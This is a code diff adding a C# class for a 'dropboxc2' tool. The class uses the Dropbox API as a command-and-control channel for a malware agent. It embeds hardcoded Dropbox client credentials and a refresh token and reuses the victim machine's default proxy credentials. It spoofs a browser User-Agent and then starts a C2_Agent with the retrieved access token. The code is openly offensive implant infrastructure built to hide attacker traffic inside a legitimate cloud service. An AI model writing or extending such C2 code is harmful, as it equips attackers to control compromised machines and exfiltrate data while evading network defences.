@@ -1,0 +1,125 @@
+using System;
+using System.Collections;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace dropboxc2
+{
+    //****************************************************************************************
+    // Class handling all communications with the Dropbox server
+    //****************************************************************************************
+    class DropboxHandler
+    {
+        WebClient webClient; // WebClient object to communicate with the C2 server
+
+        string accessToken; 
+        string authorizationHeader;
+        string client_id = "dd4kv9zho5z4gqo";
+        string client_secret = "1xn65i763fvh15m";
+        string refresh_token = "tPRWkhIVnfUAAAAAAAAMeMNJb596tEtHxm1rKI4YQaJDdf1P_U-flayO1nGnWTY";
+
+        // Dropbox API endpoints
+        static Hashtable dropboxAPI = new Hashtable()
+        {
+            { "listFolder", "https://api.dropboxapi.com/2/files/list_folder" },
+            { "move", "https://api.dropboxapi.com/2/files/move" },
+            { "uploadFile", "https://content.dropboxapi.com/2/files/upload" },
+            { "downloadFile", "https://content.dropboxapi.com/2/files/download" },
+            { "deleteFile", "https://api.dropboxapi.com/2/files/delete" },
+            { "getMetaData", "https://api.dropboxapi.com/2/files/get_metadata" }
+        };
+
+        //-------------------------------------------------------------------------------------
+        // Get Access Token from Refresh Token
+        //-------------------------------------------------------------------------------------
+        public string getAccessToken(string Basic, string refreshToken)
+        {
+            string accessToken = "";
+            string authorizationHeader = "Basic " + Basic;
+            string data = "grant_type=refresh_token&refresh_token=" + refreshToken;
+
+            Console.WriteLine("[*] Getting access token...");
+            Thread.Sleep(1000);
+
+            using (WebClient webClientNew = new WebClient())
+            {
+                IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+                if (defaultProxy != null)
+                {
+                    defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                    webClientNew.Proxy = defaultProxy;
+                }
+
+                webClientNew.Headers.Add("Authorization", authorizationHeader);
+                webClientNew.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64)");
+                webClientNew.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+
+                string jsonValue = webClientNew.UploadString("https://api.dropboxapi.com/oauth2/token", data);
+
+                // Extract token (optional — should be parsed properly)
+                if (jsonValue.Contains("\"access_token\":"))
+                {
+                    int start = jsonValue.IndexOf(":\"") + 2;
+                    int end = jsonValue.IndexOf("\",", start);
+                    accessToken = jsonValue.Substring(start, end - start);
+                }
+            }
+
+#if DEBUG
+            Console.WriteLine("[DEBUG] Access Token: " + accessToken);
+#endif
+
+            return accessToken;
+        }
+
+        //-------------------------------------------------------------------------------------
+        // Constructor
+        //-------------------------------------------------------------------------------------
+        public DropboxHandler()
+        {
+            // Combine client id and secret
+            string clientPair = client_id + ":" + client_secret;
+            string innerBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(clientPair));
+
+            // Encode again for token structure (optional, depends on spec)
+            string combined = innerBase64 + ":" + refresh_token;
+            string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(combined));
+
+            // Split token into Basic and refresh parts
+            string value = Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
+            string Basic = value.Split(':')[0];
+            string refreshToken = value.Split(':')[1];
+
+            // Get access token
+            accessToken = getAccessToken(Basic, refreshToken);
+            authorizationHeader = "Bearer " + accessToken;
+
+            // Initialize WebClient
+            webClient = new WebClient();
+
+            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+            if (defaultProxy != null)
+            {
+                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                webClient.Proxy = defaultProxy;
+            }
+
+            webClient.Headers.Add("Authorization", authorizationHeader);
+            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64)");
+
+            Console.WriteLine("[+] Access token retrieved successfully!");
+
+            // Example: pass token to agent
+            string cryptoKey = "secretKeyExample";
+            string[] args = new string[]
+            {
+                accessToken,
+                Convert.ToBase64String(Encoding.UTF8.GetBytes(cryptoKey))
+            };
+
+            // Create new C2_Agent and run
+            C2_Agent agent = new C2_Agent(args);
+        }
+    }
+}
